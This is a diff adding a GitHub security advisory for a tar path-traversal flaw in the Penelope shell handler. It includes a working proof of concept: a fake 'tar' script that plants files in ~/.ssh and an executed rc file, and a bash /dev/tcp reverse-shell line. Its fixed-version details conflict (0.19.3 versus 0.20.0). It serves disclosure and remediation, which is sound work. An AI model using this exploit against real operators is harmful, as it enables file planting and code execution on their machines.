@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-f42x-p2mx-hm8r",
+  "modified": "2026-07-29T15:52:24.190279934Z",
+  "published": "2026-07-29T15:34:16Z",
+  "aliases": [
+    "CVE-2026-50558"
+  ],
+  "summary": "Penelope unsafe tar extraction allows arbitrary local file write via crafted session archive",
+  "details": "### Summary\n\nPenelope versions prior to 0.19.3 extracted tar archives received from remote sessions without validating archive member paths. When using the affected Unix download path, a malicious or compromised remote session could return a crafted tar archive containing path traversal entries, such as `../`, causing files to be written outside the intended download directory on the Penelope operator's machine.\n\nThe impact is limited to files writable by the user running Penelope. In some cases, this arbitrary file write could be chained to operator-side code execution if the attacker can overwrite a file that Penelope or the user later executes, such as `~/.penelope/peneloperc`. The issue has been fixed in version 0.19.3 by rejecting unsafe archive paths during extraction.\n\n### Affected conditions\n\nThe issue requires the operator to use the Main Menu `download` command to download files from a malicious or compromised remote session that can influence the tar archive returned to Penelope. The Python agent download path is not affected in the same way because it does not rely on the remote `tar` command.\n\nThe vulnerable behavior is related to Python's historical `tarfile` extraction defaults. In Python versions before 3.14, `TarFile.extractall()` did not use the safer `data` extraction filter by default, so applications extracting untrusted tar archives needed to explicitly provide a safe extraction filter or perform their own path validation.\n\nPython 3.14 changes the default extraction behavior to use the `data` filter, which rejects dangerous archive features such as absolute paths and paths outside the destination directory. Penelope 0.19.3 now performs explicit validation/rejection of unsafe archive paths so the fix does not depend on the Python runtime version.\n\n### Details\n\nThe vulnerable code is in the Unix `download()` implementation.\n\nPenelope creates a local download directory:\n\n```python\nlocal_download_folder = self.directory / \"downloads\"\n```\n\nLater, it opens a tar archive received from the remote session:\n\n```python\ntar = tarfile.open(mode=mode, fileobj=tar_source)\n```\n\nThen it extracts all members without validating archive paths:\n\n```python\ntar.extractall(local_download_folder)\n```\n\nBecause member names are trusted, a malicious tar archive can contain paths such as:\n\n```text\n../../../../../home/operator/.penelope/peneloperc\n```\n\nThis escapes the intended `local_download_folder` and writes to an arbitrary path writable by the Penelope operator.\n\nThe same extraction block also suppresses Python's `DeprecationWarning` around unsafe tar extraction:\n\n```python\nwith warnings.catch_warnings():\n    warnings.simplefilter(\"ignore\", category=DeprecationWarning)\n    tar.extractall(local_download_folder)\n```\n\nThe file-write impact can be chained with Penelope's rc loading behavior:\n\n```python\ndef load_rc():\n    RC = Path(options.basedir / \"peneloperc\")\n    try:\n        with open(RC, \"r\") as rc:\n            exec(rc.read(), globals())\n```\n\nBy default, `options.basedir` is `~/.penelope`, so the executed rc file is:\n\n```text\n~/.penelope/peneloperc\n```\n\nSince session downloads are stored under `~/.penelope/sessions/\u003csession\u003e/downloads`, a crafted tar member can traverse upward and plant or replace `~/.penelope/peneloperc`. The planted Python code executes when Penelope starts again or when the operator runs `reload`.\n\n### PoC\n\nThe following reproduces the issue locally by simulating a malicious remote endpoint. The fake `tar` binary is placed first in `PATH` for the test shell, so when Penelope asks the remote session to run `tar`, the remote session returns a crafted archive with path traversal entries.\n\nStart Penelope in Terminal 1:\n\n```bash\npenelope -p 4444 -U -C #No upgrade and session connection needed\n```\n\u003cimg width=\"1920\" height=\"337\" alt=\"path1\" src=\"https://github.com/user-attachments/assets/c8cb2dd6-e6d5-43ce-b3a2-61005dbcf95c\" /\u003e\n\nPrepare the fake remote `tar` in Terminal 2:\n\n```bash\nmkdir -p /tmp/penelope-fakebin\nmkdir -p \"$HOME/.penelope\" \"$HOME/.ssh\"\ncp -f \"$HOME/.penelope/peneloperc\" /tmp/peneloperc.backup 2\u003e/dev/null || true\n\ncat \u003e /tmp/penelope-fakebin/tar \u003c\u003c'EOF'\n#!/usr/bin/env python3\nimport io\nimport os\nimport sys\nimport tarfile\nimport time\n\nhome = os.path.expanduser(\"~\")\ntarget_home = home.lstrip(\"/\")\n\ndef add_file(tar, target, data):\n    data = data.encode()\n    info = tarfile.TarInfo(target)\n    info.size = len(data)\n    info.mode = 0o644\n    info.mtime = int(time.time())\n    tar.addfile(info, io.BytesIO(data))\n\nwith tarfile.open(mode=\"w:gz\", fileobj=sys.stdout.buffer) as tar:\n    add_file(tar, \"../../../../../\" + target_home + \"/PENELOPE_CVE_PROOF.txt\", \"Penelope path traversal proof\\n\")\n    add_file(tar, \"../../../../../\" + target_home + \"/.ssh/PENELOPE_SSH_KEY.txt\", \"fake-demo-ssh_key-not-for-authentication\\n\")\n    add_file(\n        tar,\n        \"../../../../../\" + target_home + \"/.penelope/peneloperc\",\n        \"open('/\" + target_home + \"/PENELOPE_RC_EXECUTED.txt', 'w').write('peneloperc executed via reload\\\\n')\\n\"\n    )\nEOF\n\nchmod +x /tmp/penelope-fakebin/tar\ntouch /tmp/penelope_dummy\n```\n\nConnect the local test shell back to Penelope in Terminal 2:\n\n```bash\nPATH=/tmp/penelope-fakebin:$PATH bash -c 'bash -i \u003e\u0026 /dev/tcp/127.0.0.1/4444 0\u003e\u00261'\n```\n\u003cimg width=\"1920\" height=\"1000\" alt=\"path2\" src=\"https://github.com/user-attachments/assets/c6db4888-9a41-4a99-b8d1-35c06f07ca4a\" /\u003e\n\nIn Terminal 1, inside Penelope, trigger the vulnerable download:\n\n```text\ndownload /tmp/penelope_dummy\n```\n\nVerify in Terminal 3 that files were written outside the intended download directory:\n\n```bash\ncat \"$HOME/PENELOPE_CVE_PROOF.txt\"\ncat \"$HOME/.ssh/PENELOPE_SSH_KEY.txt\"\ngrep PENELOPE_RC_EXECUTED \"$HOME/.penelope/peneloperc\"\n```\n\u003cimg width=\"1920\" height=\"573\" alt=\"path3\" src=\"https://github.com/user-attachments/assets/9c7c8d3b-00ee-4d74-b195-1e91ff581243\" /\u003e\n\nExpected output includes:\n\n```text\nPenelope path traversal proof\nfake-demo-ssh_key-not-for-authentication\nopen('/home/\u003cuser\u003e/PENELOPE_RC_EXECUTED.txt', 'w').write('peneloperc executed via reload\\n')\n```\n\nIn Terminal 1, inside Penelope, execute the planted rc line:\n\n```text\nreload\n```\n\nVerify in Terminal 3 that `peneloperc` executed:\n\n```bash\ncat \"$HOME/PENELOPE_RC_EXECUTED.txt\"\n```\n\nExpected output:\n\n```text\npeneloperc executed via reload\n```\n\nCleanup:\n\n```bash\nrm -f \"$HOME/PENELOPE_CVE_PROOF.txt\"\nrm -f \"$HOME/.ssh/PENELOPE_SSH_KEY.txt\"\nrm -f \"$HOME/PENELOPE_RC_EXECUTED.txt\"\nif [ -f /tmp/peneloperc.backup ]; then cp -f /tmp/peneloperc.backup \"$HOME/.penelope/peneloperc\"; else rm -f \"$HOME/.penelope/peneloperc\"; fi\nrm -f /tmp/peneloperc.backup\nrm -rf /tmp/penelope-fakebin\nrm -f /tmp/penelope_dummy\n```\n\n### Impact\n\nA malicious remote session can write arbitrary files on the Penelope operator's machine, limited to the permissions of the user running Penelope.\n\nFor a non-root operator, this may be chained to operator-side code execution only if the attacker can overwrite a user-writable file that Penelope or the user later executes, such as:\n\n```text\n~/.penelope/peneloperc\n~/.bashrc\n~/.profile\n~/.config/autostart/*.desktop\n```\n\nFor a root operator, the impact is higher because root-writable files may be overwritten.\n\n### Suggested Fix\n\nValidate every archive member before extraction by resolving the final destination path and rejecting paths outside the intended download directory. Reject symlink and hardlink members. On supported Python versions, `filter=\"data\"` can be used as an additional safeguard.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "penelope-shell-handler",
+        "purl": "pkg:pypi/penelope-shell-handler"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.20.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.15.0",
+        "0.18.0",
+        "0.19.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-f42x-p2mx-hm8r/GHSA-f42x-p2mx-hm8r.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/brightio/penelope/security/advisories/GHSA-f42x-p2mx-hm8r"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/brightio/penelope/commit/a040afb5db32c7e80b5e8a2f9b2164cf911cfa62"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/brightio/penelope"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/brightio/penelope/releases/tag/v0.20.0"
+    }
+  ]
+}
